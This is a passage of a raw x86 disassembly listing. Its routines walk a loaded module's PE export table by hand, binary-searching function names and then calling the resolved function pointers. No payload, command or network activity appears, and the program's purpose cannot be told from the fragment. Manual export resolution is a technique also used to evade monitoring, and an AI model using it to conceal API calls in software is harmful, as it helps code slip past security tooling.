  403b5c:	78 55                	js     0x403bb3
  403b5e:	f6 c1 03             	test   $0x3,%cl
  403b61:	a1 20 5e 71 00       	mov    0x715e20,%eax
  403b66:	89 44 24 08          	mov    %eax,0x8(%esp)
  403b6a:	0f 84 24 02 00 00    	je     0x403d94
  403b70:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403b74:	e8 df e7 ff ff       	call   0x402358
  403b79:	8b 54 24 08          	mov    0x8(%esp),%edx
  403b7d:	89 c7                	mov    %eax,%edi
  403b7f:	8b 42 3c             	mov    0x3c(%edx),%eax
  403b82:	8b 4c 02 78          	mov    0x78(%edx,%eax,1),%ecx
  403b86:	81 ff ff ff 00 00    	cmp    $0xffff,%edi
  403b8c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403b90:	0f 87 3f 02 00 00    	ja     0x403dd5
  403b96:	8b 44 0a 1c          	mov    0x1c(%edx,%ecx,1),%eax
  403b9a:	01 d0                	add    %edx,%eax
  403b9c:	0f b7 cf             	movzwl %di,%ecx
  403b9f:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403ba3:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403ba7:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403baa:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  403bae:	e9 9f 02 00 00       	jmp    0x403e52
  403bb3:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403bb7:	8b 35 20 5e 71 00    	mov    0x715e20,%esi
  403bbd:	e8 96 e7 ff ff       	call   0x402358
  403bc2:	89 f2                	mov    %esi,%edx
  403bc4:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403bc7:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  403bcb:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403bd0:	77 1d                	ja     0x403bef
  403bd2:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  403bd6:	01 d7                	add    %edx,%edi
  403bd8:	0f b7 c8             	movzwl %ax,%ecx
  403bdb:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
  403bdf:	8d 04 8f             	lea    (%edi,%ecx,4),%eax
  403be2:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403be6:	8b 74 24 40          	mov    0x40(%esp),%esi
  403bea:	e9 8a 00 00 00       	jmp    0x403c79
  403bef:	8b 5c 32 18          	mov    0x18(%edx,%esi,1),%ebx
  403bf3:	89 74 24 10          	mov    %esi,0x10(%esp)
  403bf7:	8b 4c 32 20          	mov    0x20(%edx,%esi,1),%ecx
  403bfb:	01 d1                	add    %edx,%ecx
  403bfd:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403c01:	31 ff                	xor    %edi,%edi
  403c03:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403c0a:	00 00 
  403c0c:	4b                   	dec    %ebx
  403c0d:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  403c11:	eb 10                	jmp    0x403c23
  403c13:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403c1a:	00 00 
  403c1c:	43                   	inc    %ebx
  403c1d:	89 df                	mov    %ebx,%edi
  403c1f:	89 ea                	mov    %ebp,%edx
  403c21:	89 f0                	mov    %esi,%eax
  403c23:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403c27:	8d 1c 39             	lea    (%ecx,%edi,1),%ebx
  403c2a:	d1 eb                	shr    $1,%ebx
  403c2c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c30:	8b 0c 99             	mov    (%ecx,%ebx,4),%ecx
  403c33:	89 d5                	mov    %edx,%ebp
  403c35:	01 d1                	add    %edx,%ecx
  403c37:	83 ec 08             	sub    $0x8,%esp
  403c3a:	89 c6                	mov    %eax,%esi
  403c3c:	50                   	push   %eax
  403c3d:	51                   	push   %ecx
  403c3e:	e8 01 df 00 00       	call   0x411b44
  403c43:	83 c4 10             	add    $0x10,%esp
  403c46:	85 c0                	test   %eax,%eax
  403c48:	78 d2                	js     0x403c1c
  403c4a:	89 ea                	mov    %ebp,%edx
  403c4c:	89 f0                	mov    %esi,%eax
  403c4e:	75 bc                	jne    0x403c0c
  403c50:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403c54:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403c58:	01 d0                	add    %edx,%eax
  403c5a:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403c5e:	01 d1                	add    %edx,%ecx
  403c60:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403c64:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403c67:	8b 74 24 40          	mov    0x40(%esp),%esi
  403c6b:	8d 7c 24 14          	lea    0x14(%esp),%edi
  403c6f:	89 f9                	mov    %edi,%ecx
  403c71:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403c75:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403c79:	03 10                	add    (%eax),%edx
  403c7b:	83 ec 0c             	sub    $0xc,%esp
  403c7e:	55                   	push   %ebp
  403c7f:	ff 74 24 1c          	push   0x1c(%esp)
  403c83:	53                   	push   %ebx
  403c84:	51                   	push   %ecx
  403c85:	56                   	push   %esi
  403c86:	ff d2                	call   *%edx
  403c88:	83 c4 0c             	add    $0xc,%esp
  403c8b:	8b 3d 20 5e 71 00    	mov    0x715e20,%edi
  403c91:	e8 f2 e7 ff ff       	call   0x402488
  403c96:	89 fa                	mov    %edi,%edx
  403c98:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403c9b:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403c9f:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403ca4:	77 12                	ja     0x403cb8
  403ca6:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403caa:	01 d3                	add    %edx,%ebx
  403cac:	0f b7 c8             	movzwl %ax,%ecx
  403caf:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403cb3:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403cb6:	eb 73                	jmp    0x403d2b
  403cb8:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403cbc:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403cc0:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403cc4:	01 d1                	add    %edx,%ecx
  403cc6:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403cca:	31 ff                	xor    %edi,%edi
  403ccc:	4d                   	dec    %ebp
  403ccd:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403cd1:	eb 10                	jmp    0x403ce3
  403cd3:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403cda:	00 00 
  403cdc:	45                   	inc    %ebp
  403cdd:	89 ef                	mov    %ebp,%edi
  403cdf:	89 da                	mov    %ebx,%edx
  403ce1:	89 f0                	mov    %esi,%eax
  403ce3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ce7:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403cea:	d1 ed                	shr    $1,%ebp
  403cec:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403cf0:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403cf3:	89 d3                	mov    %edx,%ebx
  403cf5:	01 d1                	add    %edx,%ecx
  403cf7:	83 ec 08             	sub    $0x8,%esp
  403cfa:	89 c6                	mov    %eax,%esi
  403cfc:	50                   	push   %eax
  403cfd:	51                   	push   %ecx
  403cfe:	e8 41 de 00 00       	call   0x411b44
  403d03:	83 c4 10             	add    $0x10,%esp
  403d06:	85 c0                	test   %eax,%eax
  403d08:	78 d2                	js     0x403cdc
  403d0a:	89 da                	mov    %ebx,%edx
  403d0c:	89 f0                	mov    %esi,%eax
  403d0e:	75 bc                	jne    0x403ccc
  403d10:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403d14:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403d18:	01 d0                	add    %edx,%eax
  403d1a:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403d1e:	01 d1                	add    %edx,%ecx
  403d20:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403d24:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403d27:	8b 74 24 40          	mov    0x40(%esp),%esi
  403d2b:	03 10                	add    (%eax),%edx
  403d2d:	83 ec 0c             	sub    $0xc,%esp
  403d30:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403d34:	50                   	push   %eax
  403d35:	ff 74 24 5c          	push   0x5c(%esp)
  403d39:	ff 74 24 5c          	push   0x5c(%esp)
  403d3d:	ff 74 24 5c          	push   0x5c(%esp)
  403d41:	56                   	push   %esi
  403d42:	ff d2                	call   *%edx
  403d44:	83 c4 0c             	add    $0xc,%esp
  403d47:	8b 54 24 50          	mov    0x50(%esp),%edx
  403d4b:	85 d2                	test   %edx,%edx
  403d4d:	74 06                	je     0x403d55
  403d4f:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403d53:	89 0a                	mov    %ecx,(%edx)
  403d55:	85 c0                	test   %eax,%eax
  403d57:	78 34                	js     0x403d8d
  403d59:	8b 3d 20 5e 71 00    	mov    0x715e20,%edi
  403d5f:	e8 54 e8 ff ff       	call   0x4025b8
  403d64:	89 fa                	mov    %edi,%edx
  403d66:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  403d69:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  403d6d:	3d ff ff 00 00       	cmp    $0xffff,%eax
  403d72:	0f 87 f3 00 00 00    	ja     0x403e6b
  403d78:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  403d7c:	01 d3                	add    %edx,%ebx
  403d7e:	0f b7 c8             	movzwl %ax,%ecx
  403d81:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  403d85:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  403d88:	e9 5e 01 00 00       	jmp    0x403eeb
  403d8d:	31 c0                	xor    %eax,%eax
  403d8f:	e9 cf 03 00 00       	jmp    0x404163
  403d94:	e8 ef e6 ff ff       	call   0x402488
  403d99:	8b 54 24 08          	mov    0x8(%esp),%edx
  403d9d:	89 c1                	mov    %eax,%ecx
  403d9f:	8b 42 3c             	mov    0x3c(%edx),%eax
  403da2:	8b 44 02 78          	mov    0x78(%edx,%eax,1),%eax
  403da6:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403daa:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  403db0:	0f 87 4d 01 00 00    	ja     0x403f03
  403db6:	8b 4c 02 1c          	mov    0x1c(%edx,%eax,1),%ecx
  403dba:	01 d1                	add    %edx,%ecx
  403dbc:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403dc0:	0f b7 4c 24 04       	movzwl 0x4(%esp),%ecx
  403dc5:	2b 4c 02 10          	sub    0x10(%edx,%eax,1),%ecx
  403dc9:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403dcd:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403dd0:	e9 ae 01 00 00       	jmp    0x403f83
  403dd5:	89 7c 24 04          	mov    %edi,0x4(%esp)
  403dd9:	8b 5c 0a 18          	mov    0x18(%edx,%ecx,1),%ebx
  403ddd:	8b 6c 0a 20          	mov    0x20(%edx,%ecx,1),%ebp
  403de1:	01 d5                	add    %edx,%ebp
  403de3:	31 ff                	xor    %edi,%edi
  403de5:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403dec:	89 de                	mov    %ebx,%esi
  403dee:	4e                   	dec    %esi
  403def:	eb 12                	jmp    0x403e03
  403df1:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  403df8:	00 00 00 00 
  403dfc:	43                   	inc    %ebx
  403dfd:	89 df                	mov    %ebx,%edi
  403dff:	8b 54 24 08          	mov    0x8(%esp),%edx
  403e03:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403e07:	8d 1c 3e             	lea    (%esi,%edi,1),%ebx
  403e0a:	d1 eb                	shr    $1,%ebx
  403e0c:	8b 44 9d 00          	mov    0x0(%ebp,%ebx,4),%eax
  403e10:	01 d0                	add    %edx,%eax
  403e12:	83 ec 08             	sub    $0x8,%esp
  403e15:	51                   	push   %ecx
  403e16:	50                   	push   %eax
  403e17:	e8 28 dd 00 00       	call   0x411b44
  403e1c:	83 c4 10             	add    $0x10,%esp
  403e1f:	85 c0                	test   %eax,%eax
  403e21:	78 d9                	js     0x403dfc
  403e23:	8b 54 24 08          	mov    0x8(%esp),%edx
  403e27:	75 c3                	jne    0x403dec
  403e29:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403e2d:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403e31:	01 d0                	add    %edx,%eax
  403e33:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403e37:	01 d1                	add    %edx,%ecx
  403e39:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  403e3d:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403e40:	8b 74 24 40          	mov    0x40(%esp),%esi
  403e44:	89 f1                	mov    %esi,%ecx
  403e46:	8d 74 24 14          	lea    0x14(%esp),%esi
  403e4a:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403e4e:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403e52:	03 10                	add    (%eax),%edx
  403e54:	83 ec 0c             	sub    $0xc,%esp
  403e57:	55                   	push   %ebp
  403e58:	ff 74 24 1c          	push   0x1c(%esp)
  403e5c:	53                   	push   %ebx
  403e5d:	56                   	push   %esi
  403e5e:	51                   	push   %ecx
  403e5f:	ff d2                	call   *%edx
  403e61:	83 c4 0c             	add    $0xc,%esp
  403e64:	31 c0                	xor    %eax,%eax
  403e66:	e9 f8 02 00 00       	jmp    0x404163
  403e6b:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  403e6f:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  403e73:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  403e77:	01 d1                	add    %edx,%ecx
  403e79:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403e7d:	31 ff                	xor    %edi,%edi
  403e7f:	66 66 66 66 2e 0f 1f 	data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  403e86:	84 00 00 00 00 00 
  403e8c:	4d                   	dec    %ebp
  403e8d:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  403e91:	eb 10                	jmp    0x403ea3
  403e93:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403e9a:	00 00 
  403e9c:	45                   	inc    %ebp
  403e9d:	89 ef                	mov    %ebp,%edi
  403e9f:	89 da                	mov    %ebx,%edx
  403ea1:	89 f0                	mov    %esi,%eax
  403ea3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ea7:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  403eaa:	d1 ed                	shr    $1,%ebp
  403eac:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403eb0:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  403eb3:	89 d3                	mov    %edx,%ebx
  403eb5:	01 d1                	add    %edx,%ecx
  403eb7:	83 ec 08             	sub    $0x8,%esp
  403eba:	89 c6                	mov    %eax,%esi
  403ebc:	50                   	push   %eax
  403ebd:	51                   	push   %ecx
  403ebe:	e8 81 dc 00 00       	call   0x411b44
  403ec3:	83 c4 10             	add    $0x10,%esp
  403ec6:	85 c0                	test   %eax,%eax
  403ec8:	78 d2                	js     0x403e9c
  403eca:	89 da                	mov    %ebx,%edx
  403ecc:	89 f0                	mov    %esi,%eax
  403ece:	75 bc                	jne    0x403e8c
  403ed0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403ed4:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403ed8:	01 d0                	add    %edx,%eax
  403eda:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403ede:	01 d1                	add    %edx,%ecx
  403ee0:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403ee4:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403ee7:	8b 74 24 40          	mov    0x40(%esp),%esi
  403eeb:	03 10                	add    (%eax),%edx
  403eed:	83 ec 04             	sub    $0x4,%esp
  403ef0:	ff 74 24 50          	push   0x50(%esp)
  403ef4:	ff 74 24 4c          	push   0x4c(%esp)
  403ef8:	56                   	push   %esi
  403ef9:	ff d2                	call   *%edx
  403efb:	83 c4 04             	add    $0x4,%esp
  403efe:	e9 5b 02 00 00       	jmp    0x40415e
  403f03:	8b 6c 02 18          	mov    0x18(%edx,%eax,1),%ebp
  403f07:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403f0b:	8b 5c 02 20          	mov    0x20(%edx,%eax,1),%ebx
  403f0f:	01 d3                	add    %edx,%ebx
  403f11:	31 ff                	xor    %edi,%edi
  403f13:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  403f1a:	00 00 
  403f1c:	89 ee                	mov    %ebp,%esi
  403f1e:	4e                   	dec    %esi
  403f1f:	eb 12                	jmp    0x403f33
  403f21:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  403f28:	00 00 00 00 
  403f2c:	45                   	inc    %ebp
  403f2d:	89 ef                	mov    %ebp,%edi
  403f2f:	8b 54 24 08          	mov    0x8(%esp),%edx
  403f33:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403f37:	8d 2c 3e             	lea    (%esi,%edi,1),%ebp
  403f3a:	d1 ed                	shr    $1,%ebp
  403f3c:	8b 04 ab             	mov    (%ebx,%ebp,4),%eax
  403f3f:	01 d0                	add    %edx,%eax
  403f41:	83 ec 08             	sub    $0x8,%esp
  403f44:	51                   	push   %ecx
  403f45:	50                   	push   %eax
  403f46:	e8 f9 db 00 00       	call   0x411b44
  403f4b:	83 c4 10             	add    $0x10,%esp
  403f4e:	85 c0                	test   %eax,%eax
  403f50:	78 da                	js     0x403f2c
  403f52:	8b 54 24 08          	mov    0x8(%esp),%edx
  403f56:	75 c4                	jne    0x403f1c
  403f58:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403f5c:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  403f60:	01 d0                	add    %edx,%eax
  403f62:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  403f66:	01 d1                	add    %edx,%ecx
  403f68:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  403f6c:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  403f6f:	8b 74 24 40          	mov    0x40(%esp),%esi
  403f73:	89 f1                	mov    %esi,%ecx
  403f75:	8d 74 24 14          	lea    0x14(%esp),%esi
  403f79:	89 cf                	mov    %ecx,%edi
  403f7b:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  403f7f:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  403f83:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  403f87:	03 10                	add    (%eax),%edx
  403f89:	83 ec 0c             	sub    $0xc,%esp
  403f8c:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403f90:	50                   	push   %eax
  403f91:	ff 74 24 5c          	push   0x5c(%esp)
  403f95:	51                   	push   %ecx
  403f96:	ff 74 24 5c          	push   0x5c(%esp)
  403f9a:	57                   	push   %edi
  403f9b:	ff d2                	call   *%edx
  403f9d:	83 c4 0c             	add    $0xc,%esp
  403fa0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403fa4:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  403fa8:	85 c9                	test   %ecx,%ecx
  403faa:	74 06                	je     0x403fb2
  403fac:	8b 44 24 20          	mov    0x20(%esp),%eax
  403fb0:	89 01                	mov    %eax,(%ecx)
  403fb2:	8b 44 24 18          	mov    0x18(%esp),%eax
  403fb6:	89 44 24 24          	mov    %eax,0x24(%esp)
  403fba:	a1 20 5e 71 00       	mov    0x715e20,%eax
  403fbf:	89 44 24 10          	mov    %eax,0x10(%esp)
  403fc3:	e8 90 e3 ff ff       	call   0x402358
  403fc8:	8b 54 24 10          	mov    0x10(%esp),%edx
  403fcc:	89 c1                	mov    %eax,%ecx
  403fce:	8b 42 3c             	mov    0x3c(%edx),%eax
  403fd1:	8b 44 02 78          	mov    0x78(%edx,%eax,1),%eax
  403fd5:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  403fd9:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
  403fdf:	77 1f                	ja     0x404000
  403fe1:	8b 4c 02 1c          	mov    0x1c(%edx,%eax,1),%ecx
  403fe5:	01 d1                	add    %edx,%ecx
  403fe7:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  403feb:	0f b7 4c 24 08       	movzwl 0x8(%esp),%ecx
  403ff0:	2b 4c 02 10          	sub    0x10(%edx,%eax,1),%ecx
  403ff4:	8b 44 24 04          	mov    0x4(%esp),%eax
  403ff8:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403ffb:	e9 85 00 00 00       	jmp    0x404085
  404000:	8b 74 02 18          	mov    0x18(%edx,%eax,1),%esi
  404004:	89 44 24 28          	mov    %eax,0x28(%esp)
  404008:	8b 44 02 20          	mov    0x20(%edx,%eax,1),%eax
  40400c:	01 d0                	add    %edx,%eax
  40400e:	89 44 24 04          	mov    %eax,0x4(%esp)
  404012:	31 db                	xor    %ebx,%ebx
  404014:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  40401b:	00 
  40401c:	89 f7                	mov    %esi,%edi
  40401e:	4f                   	dec    %edi
  40401f:	eb 10                	jmp    0x404031
  404021:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%eax,%eax,1)
  404028:	00 00 00 00 
  40402c:	46                   	inc    %esi
  40402d:	89 f3                	mov    %esi,%ebx
  40402f:	89 ea                	mov    %ebp,%edx
  404031:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404035:	8d 34 1f             	lea    (%edi,%ebx,1),%esi
  404038:	d1 ee                	shr    $1,%esi
  40403a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40403e:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  404041:	89 d5                	mov    %edx,%ebp
  404043:	01 d0                	add    %edx,%eax
  404045:	83 ec 08             	sub    $0x8,%esp
  404048:	51                   	push   %ecx
  404049:	50                   	push   %eax
  40404a:	e8 f5 da 00 00       	call   0x411b44
  40404f:	83 c4 10             	add    $0x10,%esp
  404052:	85 c0                	test   %eax,%eax
  404054:	78 d6                	js     0x40402c
  404056:	89 ea                	mov    %ebp,%edx
  404058:	75 c2                	jne    0x40401c
  40405a:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40405e:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  404062:	01 d0                	add    %edx,%eax
  404064:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  404068:	01 d1                	add    %edx,%ecx
  40406a:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  40406e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404071:	8b 74 24 40          	mov    0x40(%esp),%esi
  404075:	89 f1                	mov    %esi,%ecx
  404077:	8d 74 24 14          	lea    0x14(%esp),%esi
  40407b:	89 cf                	mov    %ecx,%edi
  40407d:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  404081:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  404085:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404089:	03 10                	add    (%eax),%edx
  40408b:	83 ec 0c             	sub    $0xc,%esp
  40408e:	55                   	push   %ebp
  40408f:	51                   	push   %ecx
  404090:	53                   	push   %ebx
  404091:	56                   	push   %esi
  404092:	57                   	push   %edi
  404093:	ff d2                	call   *%edx
  404095:	83 c4 0c             	add    $0xc,%esp
  404098:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40409d:	78 2f                	js     0x4040ce
  40409f:	89 fe                	mov    %edi,%esi
  4040a1:	8b 3d 20 5e 71 00    	mov    0x715e20,%edi
  4040a7:	e8 0c e5 ff ff       	call   0x4025b8
  4040ac:	89 fa                	mov    %edi,%edx
  4040ae:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  4040b1:	8b 7c 0a 78          	mov    0x78(%edx,%ecx,1),%edi
  4040b5:	3d ff ff 00 00       	cmp    $0xffff,%eax
  4040ba:	77 1c                	ja     0x4040d8
  4040bc:	8b 5c 3a 1c          	mov    0x1c(%edx,%edi,1),%ebx
  4040c0:	01 d3                	add    %edx,%ebx
  4040c2:	0f b7 c8             	movzwl %ax,%ecx
  4040c5:	2b 4c 3a 10          	sub    0x10(%edx,%edi,1),%ecx
  4040c9:	8d 04 8b             	lea    (%ebx,%ecx,4),%eax
  4040cc:	eb 7d                	jmp    0x40414b
  4040ce:	b8 05 00 00 c0       	mov    $0xc0000005,%eax
  4040d3:	e9 8b 00 00 00       	jmp    0x404163
  4040d8:	8b 6c 3a 18          	mov    0x18(%edx,%edi,1),%ebp
  4040dc:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4040e0:	8b 4c 3a 20          	mov    0x20(%edx,%edi,1),%ecx
  4040e4:	01 d1                	add    %edx,%ecx
  4040e6:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4040ea:	31 ff                	xor    %edi,%edi
  4040ec:	4d                   	dec    %ebp
  4040ed:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  4040f1:	eb 10                	jmp    0x404103
  4040f3:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4040fa:	00 00 
  4040fc:	45                   	inc    %ebp
  4040fd:	89 ef                	mov    %ebp,%edi
  4040ff:	89 da                	mov    %ebx,%edx
  404101:	89 f0                	mov    %esi,%eax
  404103:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404107:	8d 2c 39             	lea    (%ecx,%edi,1),%ebp
  40410a:	d1 ed                	shr    $1,%ebp
  40410c:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404110:	8b 0c a9             	mov    (%ecx,%ebp,4),%ecx
  404113:	89 d3                	mov    %edx,%ebx
  404115:	01 d1                	add    %edx,%ecx
  404117:	83 ec 08             	sub    $0x8,%esp
  40411a:	89 c6                	mov    %eax,%esi
  40411c:	50                   	push   %eax
  40411d:	51                   	push   %ecx
  40411e:	e8 21 da 00 00       	call   0x411b44
  404123:	83 c4 10             	add    $0x10,%esp
  404126:	85 c0                	test   %eax,%eax
  404128:	78 d2                	js     0x4040fc
  40412a:	89 da                	mov    %ebx,%edx
  40412c:	89 f0                	mov    %esi,%eax
  40412e:	75 bc                	jne    0x4040ec
  404130:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404134:	8b 44 0a 24          	mov    0x24(%edx,%ecx,1),%eax
  404138:	01 d0                	add    %edx,%eax
  40413a:	8b 4c 0a 1c          	mov    0x1c(%edx,%ecx,1),%ecx
  40413e:	01 d1                	add    %edx,%ecx
  404140:	0f b7 04 68          	movzwl (%eax,%ebp,2),%eax
  404144:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404147:	8b 74 24 40          	mov    0x40(%esp),%esi
  40414b:	03 10                	add    (%eax),%edx
  40414d:	83 ec 04             	sub    $0x4,%esp
  404150:	ff 74 24 50          	push   0x50(%esp)
  404154:	ff 74 24 4c          	push   0x4c(%esp)
  404158:	56                   	push   %esi
  404159:	ff d2                	call   *%edx
  40415b:	83 c4 04             	add    $0x4,%esp
  40415e:	b8 01 00 00 00       	mov    $0x1,%eax
  404163:	83 c4 2c             	add    $0x2c,%esp
  404166:	5e                   	pop    %esi
  404167:	5f                   	pop    %edi
  404168:	5b                   	pop    %ebx
  404169:	5d                   	pop    %ebp
  40416a:	c3                   	ret
  40416b:	90                   	nop
  40416c:	8b 44 24 04          	mov    0x4(%esp),%eax
  404170:	8b 48 3c             	mov    0x3c(%eax),%ecx
  404173:	0f b7 44 01 5c       	movzwl 0x5c(%ecx,%eax,1),%eax
  404178:	83 f8 03             	cmp    $0x3,%eax
  40417b:	74 0b                	je     0x404188
  40417d:	0f b7 c0             	movzwl %ax,%eax
  404180:	83 f8 02             	cmp    $0x2,%eax
  404183:	e9 e0 ee ff ff       	jmp    0x403068
  404188:	e9 ab ed ff ff       	jmp    0x402f38
  40418d:	90                   	nop
  40418e:	90                   	nop
  40418f:	90                   	nop
  404190:	55                   	push   %ebp
  404191:	53                   	push   %ebx
  404192:	57                   	push   %edi
  404193:	56                   	push   %esi
  404194:	83 ec 0c             	sub    $0xc,%esp
  404197:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  40419b:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40419f:	8b 35 20 5e 71 00    	mov    0x715e20,%esi
  4041a5:	e8 fe e9 ff ff       	call   0x402ba8
  4041aa:	89 f2                	mov    %esi,%edx
  4041ac:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  4041af:	8b 74 0a 78          	mov    0x78(%edx,%ecx,1),%esi
  4041b3:	3d ff ff 00 00       	cmp    $0xffff,%eax
  4041b8:	77 19                	ja     0x4041d3
  4041ba:	8b 7c 32 1c          	mov    0x1c(%edx,%esi,1),%edi
  4041be:	01 d7                	add    %edx,%edi
  4041c0:	0f b7 c8             	movzwl %ax,%ecx
  4041c3:	2b 4c 32 10          	sub    0x10(%edx,%esi,1),%ecx
